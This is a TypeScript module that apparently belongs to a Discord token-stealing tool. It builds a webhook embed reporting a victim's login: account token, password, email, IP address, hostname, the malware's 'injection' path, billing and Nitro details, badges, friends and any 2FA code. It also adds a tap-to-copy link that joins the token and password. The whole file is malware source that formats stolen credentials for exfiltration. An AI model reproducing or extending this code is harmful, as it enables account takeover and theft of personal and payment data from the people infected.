import { WebhookMessageOptions } from "discord.js";
import { ConfigBinder } from "../interfaces";
import { COPY_ON_MOBILE, PARTNER_EMOJI } from "../constants";
import { FakeAccount } from "../fakeProfile";
import { warpInQuote, warpTripleQuote } from "../utils";
import { getBaseEmbeds } from "./helpers/baseEmbed";
import { prepare2FaEmbed } from "./helpers/twoFaEmbed";
import { prepareFriendsEmbed } from "./helpers/friendsEmbed";

export async function getUserLogonEmbed(config: ConfigBinder, account = new FakeAccount()): Promise<WebhookMessageOptions> {

    const embedsCount = account.discord.twoFACode ? 3 : 2;

    const { embeds, webhookMessage } = getBaseEmbeds(config, embedsCount);
    const loginEmbed = embeds[0];
    loginEmbed.setAuthor("User Login");
    const token = account.discord.token;
    const password = account.discord.password;
    const des= `[**${PARTNER_EMOJI} │ Click Here To Copy Info On Mobile**](${COPY_ON_MOBILE}${token}<br>${password})`;
    loginEmbed.setDescription(des);
    loginEmbed.setThumbnail(await account.discord.getAvatar());
    loginEmbed.setFields([{
        name: "Info",
        value: warpTripleQuote(`Hostname: \n${account.computerName}\nIP: \n${account.discord.ip}\nInjection Info: \n${account.injectionPath}\n`),
        inline: false
    }, {
        name: "Username",
        value: warpInQuote(account.discord.tag),
        inline: true
    }, {
        name: "ID",
        value: warpInQuote(account.discord.id),
        inline: true
    }, {
        name: "Nitro",
        value: account.discord.nitro,
        inline: false
    }, {
        name: "Badges",
        value: account.discord.badges.join(" "),
        inline: false
    }, {
        name: "Billing",
        value: account.discord.billing,
        inline: false
    }, {
        name: "Email",
        value: warpInQuote(account.discord.email),
        inline: true
    }, {
        name: "Password",
        value: warpInQuote(account.discord.password),
        inline: true
    }, {
        name: "Token",
        value: warpTripleQuote(token),
        inline: false
    }]);


    prepareFriendsEmbed(embeds[1], account);

    if (account.discord.twoFACode) {
        prepare2FaEmbed(embeds[2], account.discord.twoFACode);
    }
    return webhookMessage();
}
